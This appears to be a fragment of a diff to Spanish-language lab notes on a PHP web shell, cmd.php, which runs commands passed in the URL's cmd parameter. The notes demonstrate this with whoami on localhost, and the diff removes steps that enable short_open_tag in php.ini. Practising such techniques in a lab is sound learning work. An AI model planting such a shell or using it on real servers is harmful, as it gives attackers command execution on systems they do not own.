@@ -2014,10 +2014,6 @@ if (isset($_GET['cmd'])){
 
 ls
 rm index.html
-nano /etc/php/8.1/apache2/php.ini
-ctrl + w # Para filtar por short_open_tag
-short_open_tag = On
-service apache2 restart
 # En el navegador damos clic en cmd.php
 # En la url hacamos lo siguiente
 localhost/cmd.php?cmd=whoami # Responde con www-data
